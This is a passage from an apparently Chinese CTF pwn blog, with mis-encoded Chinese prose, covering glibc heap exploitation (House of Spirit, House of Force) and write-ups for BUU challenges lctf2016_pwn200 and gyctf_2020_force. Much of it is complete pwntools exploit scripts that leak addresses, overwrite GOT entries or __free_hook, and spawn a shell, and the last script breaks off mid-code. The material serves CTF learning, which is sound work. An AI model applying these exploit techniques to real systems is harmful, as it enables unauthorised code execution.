p64(<span class="hljs-number">0x81</span>) <br>fake_chunk += p64(ptr - <span class="hljs-number">0x18</span>) + p64(ptr - <span class="hljs-number">0x10</span>)<br>fake_chunk += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x80</span>)<br>edit(<span class="hljs-number">7</span>,fake_chunk)<br>free(<span class="hljs-number">8</span>)<br><br>payload = p64(heap_addr + <span class="hljs-number">0x190</span>) * <span class="hljs-number">2</span> + p64(free_got) + p64(ptr - <span class="hljs-number">0x18</span>)<br>edit(<span class="hljs-number">7</span>,payload)<br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">5</span>) <span class="hljs-comment">#double free</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,p64(key))<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x80</span>,p32(<span class="hljs-number">5</span>) + p32(<span class="hljs-number">5</span>))<br>show(<span class="hljs-number">6</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br>log.success(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload = p64(free_hook) * <span class="hljs-number">3</span> + p64(ptr - <span class="hljs-number">0x18</span>)<br>edit(<span class="hljs-number">7</span>,payload)<br>edit(<span class="hljs-number">5</span>,p64(system))<br>free(<span class="hljs-number">10</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="äºŒåã€lctf2016-pwn200"><a href="#äºŒåã€lctf2016-pwn200" class="headerlink" title="äºŒåã€lctf2016_pwn200"></a>äºŒåã€lctf2016_pwn200</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210905105020439.png" alt="image-20210905105020439"></p>
<p>å¸¸è§„checksecä¸€ä¸‹ï¼Œ64ä½ï¼Œä¿æŠ¤å‡ ä¹éƒ½æ²¡å¼€å¯</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210905105059956.png" alt="image-20210905105059956"></p>
<p>è¿›å…¥IDAï¼Œè¿›å…¥çš„ç¬¬ä¸€ä¸ªå‡½æ•°å°±å­˜åœ¨é—®é¢˜ï¼Œè¿™è¾¹æœ€é•¿è¾“å…¥0x30çš„å­—ç¬¦ï¼Œä½†æ˜¯v2è·ç¦»rbpçš„è·ç¦»ä¹Ÿæ˜¯0x30ï¼Œæ‰€ä»¥å¯ä»¥å€Ÿæ­¤æ‰“å°å‡ºrbpçš„å€¼ï¼Œå¾—åˆ°æ ˆä¸Šåœ°å€ï¼Œé‚£ä¹ˆåº”è¯¥å°±æ˜¯ret2shellcodeäº†</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210905105342837.png" alt="image-20210905105342837"></p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210905105242460.png" alt="image-20210905105242460"></p>
<p>å†å¾€ä¸‹çœ‹ï¼Œè¿™è¾¹å­˜åœ¨ä»»æ„åœ°å€å†™</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210905110435529.png" alt="image-20210905110435529"></p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210905110553881.png" alt="image-20210905110553881"></p>
<p>è®¡ç®—ä¸€ä¸‹åç§»</p>
<p>ç„¶åé€šè¿‡ä»»æ„åœ°å€å†™å¾€free@gotè¡¨é‡Œå†™å…¥å‰é¢ç®—å¥½çš„shellcodeçš„åœ°å€ï¼Œå†æ‰§è¡Œåˆ°åé¢ç¨‹åºä¸­çš„freeå‡½æ•°ï¼Œç„¶åè·³è½¬åˆ°å†™å¥½çš„shellcodeæ‰§è¡Œ</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210905112409521.png" alt="image-20210905112409521"></p>
<p>getshellï¼</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25517</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn200&#x27;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn200&#x27;</span>)<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><span class="hljs-comment">#gdb.attach(p,&#x27;b *main&#x27;)</span><br><br>p.recvuntil(<span class="hljs-string">&quot;who are u?\n&quot;</span>)<br>shellcode = asm(shellcraft.sh())<br>p.send(shellcode.ljust(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;a&#x27;</span>))<br>leak_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">80</span><br>log.info(<span class="hljs-built_in">hex</span>(leak_addr))<br>p.recvuntil(<span class="hljs-string">&quot;give me your id ~~?&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;give me money~\n&quot;</span>)<br>payload = p64(leak_addr) + <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x30</span> + p64(free_got)<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&#x27;choice :&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>house ofç³»åˆ—</title>
    <url>/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/</url>
    <content><![CDATA[<p> è¯¥ç³»åˆ—å†…å®¹è¾ƒå¤šï¼Œå°†ä¼šåœ¨è¾ƒé•¿æ—¶é—´æŒç»­æ›´æ–°</p>
<h2 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h2><p>çˆ†ç ´æ¦‚ç‡å¤ªä½ï¼Œä¸å»ºè®®å†ç”¨ï¼Œäº†è§£ä¸€ä¸‹åˆ©ç”¨æ€è·¯å³å¯</p>
<h2 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h2><p>åˆ©ç”¨æ¡ä»¶</p>
<ul>
<li>ä¿®æ”¹åçš„Top chunk size &gt; MINSIZE ï¼ˆ0x10ï¼‰</li>
<li>Top chunk inuse == 1</li>
<li>ä¿®æ”¹åçš„Top chunk size å¿…é¡»å¯¹é½åˆ°å†…å­˜é¡µ</li>
<li>æœ€åä¸‹ä¸€æ¬¡åˆ†é…çš„chunkå¤§äºTop chunk size - 0x10</li>
</ul>
<h2 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h2><p>æŠ€æœ¯æ¥æºï¼š<a href="https://www.anquanke.com/post/id/85357">https://www.anquanke.com/post/id/85357</a></p>
<p>House of Spiritï¼ˆä¸‹é¢ç§°ä¸ºhosï¼‰ç®—æ˜¯ä¸€ä¸ªç»„åˆå‹æ¼æ´çš„åˆ©ç”¨ï¼Œæ˜¯å˜é‡è¦†ç›–å’Œå †ç®¡ç†æœºåˆ¶çš„ç»„åˆåˆ©ç”¨ï¼Œå…³é”®åœ¨äºèƒ½å¤Ÿè¦†ç›–ä¸€ä¸ªå †æŒ‡é’ˆå˜é‡ï¼Œä½¿å…¶æŒ‡å‘å¯æ§çš„åŒºåŸŸï¼Œåªè¦æ„é€ å¥½æ•°æ®ï¼Œé‡Šæ”¾åç³»ç»Ÿä¼šé”™è¯¯çš„å°†è¯¥åŒºåŸŸä½œä¸ºå †å—æ”¾åˆ°ç›¸åº”çš„fast biné‡Œé¢ï¼Œæœ€åå†åˆ†é…å‡ºæ¥çš„æ—¶å€™ï¼Œå°±æœ‰å¯èƒ½æ”¹å†™æˆ‘ä»¬ç›®æ ‡åŒºåŸŸã€‚</p>
<h3 id="ä½¿ç”¨æ¡ä»¶"><a href="#ä½¿ç”¨æ¡ä»¶" class="headerlink" title="ä½¿ç”¨æ¡ä»¶"></a>ä½¿ç”¨æ¡ä»¶</h3><p>ï¼ˆ1ï¼‰æƒ³è¦æ§åˆ¶çš„ç›®æ ‡åŒºåŸŸçš„å‰æ®µç©ºé—´ä¸åæ®µç©ºé—´éƒ½æ˜¯å¯æ§çš„å†…å­˜åŒºåŸŸ</p>
<p>ä¸€èˆ¬æ¥è¯´æƒ³è¦æ§åˆ¶çš„ç›®æ ‡åŒºåŸŸå¤šä¸ºè¿”å›åœ°å€æˆ–æ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œè¯¥å†…å­˜åŒºåŸŸæˆ‘ä»¬è¾“å…¥çš„æ•°æ®æ˜¯æ— æ³•æ§åˆ¶çš„ï¼Œæƒ³è¦åˆ©ç”¨hosæ”»å‡»æŠ€æœ¯æ¥æ”¹å†™è¯¥åŒºåŸŸï¼Œé¦–å…ˆéœ€è¦æˆ‘ä»¬å¯ä»¥æ§åˆ¶é‚£ç‰‡ç›®æ ‡åŒºåŸŸçš„å‰é¢ç©ºé—´å’Œåé¢ç©ºé—´ï¼Œç¤ºæ„å›¾å¦‚ä¸‹</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/t01ab6f5c485fc67d66.png" alt="http://p7.qhimg.com/t01c4e1f8669a8b77bd.png"></p>
<p>ï¼ˆ2ï¼‰å­˜åœ¨å¯å°†å †å˜é‡æŒ‡é’ˆè¦†ç›–ä¸ºæŒ‡å‘å¯æ§åŒºåŸŸï¼Œå³ä¸Šä¸€æ­¥ä¸­çš„åŒºåŸŸ</p>
<h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p>ï¼ˆ1ï¼‰ä¼ªé€ å †å—ï¼Œåœ¨å¯æ§1åŠå¯æ§2ï¼ˆå¯æ§2çš„ä¼ªé€ sizeä¸èƒ½å°äº2*SIZE_SZä¸”ä¸èƒ½å¤§äºå·²åˆ†é…å†…å­˜ï¼‰æ„é€ å¥½æ•°æ®ï¼Œå°†å®ƒä¼ªé€ æˆä¸€ä¸ªfast chunkã€‚</p>
<p>ï¼ˆ2ï¼‰è¦†ç›–å †æŒ‡é’ˆæŒ‡å‘ä¸Šä¸€æ­¥ä¼ªé€ çš„å †å—ã€‚</p>
<p>ï¼ˆ3ï¼‰é‡Šæ”¾å †å—ï¼Œå°†ä¼ªé€ çš„å †å—é‡Šæ”¾å…¥fast biné‡Œé¢ã€‚</p>
<p>ï¼ˆ4ï¼‰ç”³è¯·å †å—ï¼Œå°†åˆšåˆšé‡Šæ”¾çš„å †å—ç”³è¯·å‡ºæ¥ï¼Œæœ€ç»ˆä½¿å¾—å¯ä»¥å¾€ç›®æ ‡åŒºåŸŸä¸­å†™å…¥æ•°æ®ï¼Œå®ç°ç›®çš„ã€‚</p>
<p>ç¬¬ä¸€æ­¥ä¸­çš„ä¼ªé€ å †å—çš„è¿‡ç¨‹ï¼Œfastbinæ˜¯ä¸€ä¸ªå•é“¾è¡¨ç»“æ„ï¼Œéµå¾ªFIFOçš„è§„åˆ™ï¼Œ32ä½ç³»ç»Ÿä¸­fastbinçš„å¤§å°æ˜¯åœ¨16<del>64å­—èŠ‚ä¹‹é—´ï¼Œ64ä½æ˜¯åœ¨32</del>128å­—èŠ‚ä¹‹é—´ã€‚é‡Šæ”¾æ—¶ä¼šè¿›è¡Œä¸€äº›æ£€æŸ¥ï¼Œæ‰€ä»¥éœ€è¦å¯¹ä¼ªå †å—ä¸­çš„æ•°æ®è¿›è¡Œæ„é€ ï¼Œä½¿å…¶é¡ºåˆ©çš„é‡Šæ”¾è¿›åˆ°fastbiné‡Œé¢</p>
<h3 id="ä¾‹é¢˜BUU-lctf2016pwn200"><a href="#ä¾‹é¢˜BUU-lctf2016pwn200" class="headerlink" title="ä¾‹é¢˜BUU-lctf2016pwn200"></a>ä¾‹é¢˜BUU-lctf2016pwn200</h3><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905204052044.png" alt="image-20210905204052044"></p>
<p>å¸¸è§„checksecä¸€ä¸‹ï¼Œä¿æŠ¤åŸºæœ¬æ²¡å¼€ã€‚</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905204120841.png" alt="image-20210905204120841"></p>
<p>è¿™é‡Œçš„è¾“å…¥å­˜åœ¨æ¼æ´ï¼Œå¡«æ»¡å¯ä»¥æ³„éœ²å‡ºrspä¸Šçš„å€¼ï¼Œè·å¾—æ ˆä¸Šåœ°å€</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/t014c47eb8e813cbe79.png" alt="http://p8.qhimg.com/t01eb7870c8fa4fde39.png"></p>
<p>ç›®æ ‡åœ°å€çš„æ„é€ ä¸ºä¸Šå›¾æ‰€ç¤ºï¼Œåœ¨moneyä¸­è¾“å…¥çš„æ˜¯ä¼ªå †å—çš„sizeï¼Œåœ¨idé‡Œè¾“å…¥çš„æ˜¯ä¸‹ä¸€ä¸ªå †å—çš„sizeï¼Œä»¥æ­¤ç»•è¿‡freeé‡Šæ”¾å †å—æ—¶å€™ç³»ç»Ÿçš„æ£€æŸ¥</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905204549591.png" alt="image-20210905204549591"></p>
<p>ç„¶åå°±æ˜¯ï¼š</p>
<p>ï¼ˆ1ï¼‰è¦†ç›–å †æŒ‡é’ˆï¼Œåœ¨è¾“å…¥moneyçš„æ—¶å€™ï¼Œä¼šè¦†ç›–å †å—ã€‚</p>
<p>ï¼ˆ2ï¼‰è°ƒç”¨freeå‡½æ•°å°†ä¼ªå †å—é‡Šæ”¾åˆ°fastbinä¸­</p>
<p>ï¼ˆ3ï¼‰ç”³è¯·å †å—ï¼Œå°†åˆšåˆšçš„ä¼ªå †å—ç”³è¯·å‡ºæ¥</p>
<p>ï¼ˆ4ï¼‰è¾“å…¥æ•°æ®ï¼Œå³å¯ä¿®æ”¹ç›®æ ‡åŒºåŸŸï¼Œeipï¼Œä½¿å…¶æŒ‡å‘shellcode</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905230703667.png" alt="image-20210905230703667"></p>
<p>è¿™æ˜¯æ„é€ å‡ºæ¥çš„fake_chunkï¼Œåé¢å°±æ˜¯è¦æŠŠè¿™å—é‡Šæ”¾äº†ï¼Œç„¶åå†ç”³è¯·å›æ¥ï¼ŒæŠŠ0x400b34è¿™ä¸ªåœ°å€è¦†ç›–ä¸ºshellcodeï¼Œå³å¯åœ¨é€€å‡ºç¨‹åºæ—¶è¿”å›åˆ°shellcodeå»æ‰§è¡Œ</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905212358111.png" alt="image-20210905212358111"></p>
<p>getshellï¼</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,26770)</span><br>p = process(<span class="hljs-string">&#x27;./pwn200&#x27;</span>)<br><br>free_got = <span class="hljs-number">0x0000000000602018</span><br><br>shellcode = asm(shellcraft.amd64.linux.sh(), arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#part one</span><br>payload  = <span class="hljs-string">&#x27;&#x27;</span><br>payload += shellcode.ljust(<span class="hljs-number">48</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;who are u?\n&#x27;</span>)<br>p.send(payload)<br>p.recvuntil(payload)<br><br>rbp_addr = u64(p.recvn(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br><br>shellcode_addr = rbp_addr - <span class="hljs-number">0x50</span> <span class="hljs-comment"># 20H + 30H</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;shellcode_addr: &quot;</span>, <span class="hljs-built_in">hex</span>(shellcode_addr)<br>fake_addr = rbp_addr - <span class="hljs-number">0x90</span> <span class="hljs-comment"># offset 0x40 to shellcode, 0x400a29 return address</span><br><br><br>p.recvuntil(<span class="hljs-string">&#x27;give me your id ~~?\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;33&#x27;</span>) <span class="hljs-comment"># id</span><br>p.recvuntil(<span class="hljs-string">&#x27;give me money~\n&#x27;</span>)<br><br><span class="hljs-comment">#part two</span><br><span class="hljs-comment">#32bytes padding + prev_size + size + padding + fake_addr</span><br>data = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x41</span>)      <span class="hljs-comment"># no strcpy</span><br>data = data.ljust(<span class="hljs-number">0x38</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(fake_addr)<br><span class="hljs-built_in">print</span> data<br>p.send(data)<br><br>p.recvuntil(<span class="hljs-string">&#x27;choice : &#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)     <span class="hljs-comment"># free(fake_addr)</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;choice : &#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)     <span class="hljs-comment">#malloc(fake_addr) #fake_addr</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;long?&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;48&#x27;</span>)<br>p.recvline(<span class="hljs-string">&#x27;48&#x27;</span>)  <br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span> + p64(shellcode_addr) <span class="hljs-comment"># write to target_addr</span><br><br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;choice&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h2><p>æ¥æºï¼šctf.wiki</p>
<p>House Of Force äº§ç”Ÿçš„åŸå› åœ¨äº glibc å¯¹ top chunk çš„å¤„ç†ï¼Œè¿›è¡Œå †åˆ†é…æ—¶ï¼Œå¦‚æœæ‰€æœ‰ç©ºé—²çš„å—éƒ½æ— æ³•æ»¡è¶³éœ€æ±‚ï¼Œé‚£ä¹ˆå°±ä¼šä» top chunk ä¸­åˆ†å‰²å‡ºç›¸åº”çš„å¤§å°ä½œä¸ºå †å—çš„ç©ºé—´ã€‚</p>
<p>é‚£ä¹ˆï¼Œå½“ä½¿ç”¨ top chunk åˆ†é…å †å—çš„ size å€¼æ˜¯ç”±ç”¨æˆ·æ§åˆ¶çš„ä»»æ„å€¼æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿç­”æ¡ˆæ˜¯ï¼Œå¯ä»¥ä½¿å¾— top chunkæŒ‡å‘æˆ‘ä»¬æœŸæœ›çš„ä»»ä½•ä½ç½®ï¼Œè¿™å°±ç›¸å½“äºä¸€æ¬¡ä»»æ„åœ°å€å†™ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// è·å–å½“å‰çš„top chunkï¼Œå¹¶è®¡ç®—å…¶å¯¹åº”çš„å¤§å°</span><br>victim = av-&gt;top;<br>size   = chunksize(victim);<br><span class="hljs-comment">// å¦‚æœåœ¨åˆ†å‰²ä¹‹åï¼Œå…¶å¤§å°ä»ç„¶æ»¡è¶³ chunk çš„æœ€å°å¤§å°ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è¿›è¡Œåˆ†å‰²ã€‚</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb + MINSIZE)) <br>&#123;<br>    remainder_size = size - nb;<br>    remainder      = chunk_at_offset(victim, nb);<br>    av-&gt;top        = remainder;<br>    set_head(victim, nb | PREV_INUSE |<br>            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>    set_head(remainder, remainder_size | PREV_INUSE);<br><br>    check_malloced_chunk(av, victim, nb);<br>    <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>    alloc_perturb(p, bytes);<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿™æ˜¯top chunkåœ¨åˆ†é…å †å—æ—¶ä¼šæ‰§è¡Œçš„æ“ä½œçš„æºç ï¼Œä¼šå¯¹ç”¨æˆ·è¯·æ±‚çš„sizeå’Œ top chunk ç°æœ‰çš„ size è¿›è¡ŒéªŒè¯ï¼Œå¹¶ä¸”å°†ä¼šæ›´æ–°top chunkä½ç½®ï¼Œä»¥åŠsize</p>
<p>æˆ‘ä»¬ä¸»è¦å…³å¿ƒçš„æ˜¯å¯¹äºsizeçš„éªŒè¯ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb + MINSIZE) <span class="hljs-comment">//nbæŒ‡æˆ‘ä»¬ç”³è¯·çš„å †å—å¤§å°</span><br></code></pre></td></tr></table></figure>

<p>æ‰€ä»¥ï¼Œè®¾æƒ³ä¸€ä¸‹ï¼šå¦‚æœå¯ä»¥ç¯¡æ”¹ size ä¸ºä¸€ä¸ªå¾ˆå¤§å€¼ï¼Œå°±å¯ä»¥è½»æ¾çš„é€šè¿‡è¿™ä¸ªéªŒè¯ã€‚ä¸€èˆ¬çš„åšæ³•æ˜¯æŠŠ top chunk çš„ size æ”¹ä¸º-1ï¼Œå› ä¸ºåœ¨è¿›è¡Œæ¯”è¾ƒæ—¶ä¼šæŠŠ size è½¬æ¢æˆæ— ç¬¦å·æ•°ï¼Œå› æ­¤ -1 ä¹Ÿå°±æ˜¯è¯´unsigned long ä¸­æœ€å¤§çš„æ•°ï¼Œæ‰€ä»¥æ— è®ºå¦‚ä½•éƒ½å¯ä»¥é€šè¿‡éªŒè¯ã€‚</p>
<h3 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><p>ç»¼åˆä¸Šé¢çš„èƒŒæ™¯ï¼Œæˆ‘ä»¬å¯ä»¥å¾—å‡ºï¼Œè¦æƒ³åˆ©ç”¨House of Forceï¼Œè¦æœ‰ä»¥ä¸‹æ¡ä»¶ï¼š</p>
<ul>
<li><p>èƒ½å¤Ÿä»¥æº¢å‡ºç­‰æ–¹å¼æ§åˆ¶åˆ° top chunk çš„ size åŸŸ</p>
<ul>
<li>ä¸ºäº†èƒ½å°†sizeä¿®æ”¹ä¸º-1(0xFFFFFFFFFFFFFFFF)</li>
</ul>
</li>
<li><p>èƒ½å¤Ÿè‡ªç”±åœ°æ§åˆ¶å †åˆ†é…å°ºå¯¸çš„å¤§å°</p>
<ul>
<li>ä¸ºäº†èƒ½å¤Ÿå°†top chunkæŠ¬å‡åˆ°æˆ‘ä»¬æƒ³å†™å…¥çš„åœ°å€é™„è¿‘ï¼Œä¸€èˆ¬ä¸ºhookï¼Œè€Œè¿™ä¹‹é—´çš„åç§»éå¸¸å¤§</li>
</ul>
</li>
</ul>
<h3 id="ä¾‹é¢˜BUU-gyctf-2020-force"><a href="#ä¾‹é¢˜BUU-gyctf-2020-force" class="headerlink" title="ä¾‹é¢˜BUU-gyctf_2020_force"></a>ä¾‹é¢˜BUU-gyctf_2020_force</h3><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916151101226.png" alt="image-20210916151101226"></p>
<p>å¸¸è§„checksecä¸€ä¸‹ï¼Œ64ä½ä¿æŠ¤å…¨å¼€</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916153042695.png" alt="image-20210916153042695"></p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916153101689.png" alt="image-20210916153101689"></p>
<p>è¿›å…¥IDAï¼Œæ€»å…±å°±ä¸¤ä¸ªåŠŸèƒ½ï¼šä¸€ä¸ªæ˜¯ç”³è¯·å †å—ï¼Œå †å—å¤§å°æ— é™åˆ¶ï¼Œå¹¶ä¸”èƒ½è¿”å›ç»™å †åœ°å€ï¼Œç„¶åå¡«å…¥å†…å®¹æ˜¯å›ºå®šé•¿åº¦0x50ï¼›å¦å¤–ä¸€ä¸ªputsåŠŸèƒ½ã€‚ã€‚ã€‚å±ç”¨æ²¡æœ‰ï¼å› ä¸ºå­˜åœ¨å›ºå®šé•¿åº¦çš„å†™å…¥ï¼Œé‚£ä¹ˆåªè¦ç”³è¯·ä¸€ä¸ªå°å †å—å°±å¯ä»¥è¿›è¡Œæº¢å‡ºä¿®æ”¹top chunkçš„sizeä½ï¼Œæ‰€ä»¥House of Forceçš„ä¸¤ä¸ªæ¡ä»¶éƒ½è¾¾æˆäº†</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916163309864.png" alt="image-20210916163309864"></p>
<p>å› ä¸ºç¨‹åºä¼šè¿”å›å †çš„åœ°å€ï¼Œç¨‹åºåˆä¸é™åˆ¶å †å—çš„å¤§å°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”³è¯·ä¸€ä¸ªå¤§äºtop chunkçš„å †å—ï¼Œé‚£ä¹ˆç¨‹åºå°±ä¼šè°ƒç”¨mmapè¿›è¡Œåˆ†é…å †å—ï¼Œæ­¤æ—¶å †å—çš„åœ°å€ä¼šæ˜¯libcä¸­çš„ä¸€ä¸ªåœ°å€</p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916163532720.png" alt="image-20210916163532720"></p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916205725583.png" alt="image-20210916205725583"></p>
<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210916205619022.png" alt="image-20210916205619022"></p>
<p>ç„¶åç”³è¯·ä¸€ä¸ªå°äº0x50çš„å †å—ï¼Œè®©å †å—èƒ½è¿›è¡Œæº¢å‡ºè¦†ç›–top chunkçš„sizeä½ï¼Œä¿®æ”¹ä¸º-1ï¼ˆä¹Ÿå°±æ˜¯0xFFFFFFFFFFFFFFFFï¼‰ï¼ŒåŒæ—¶ä¹Ÿå€Ÿç€è¿™ä¸ªå †å—èƒ½è·å–åˆ°top chunkçš„åœ°å€ã€‚ç„¶åç›´æ¥ç”³è¯·ä¸€ä¸ªè¶…å¤§å †å—ï¼Œç›´æ¥å æ»¡top chunkä¸__malloc_hookä¹‹é—´é•¿åº¦ï¼Œç„¶åå†ç”³è¯·ä¸€ä¸ªå †å—å»ä¿®æ”¹hookçš„ä¸ºone_gadgetå³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./gyctf_2020_force&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28894</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;size\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>	addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>	p.recvuntil(<span 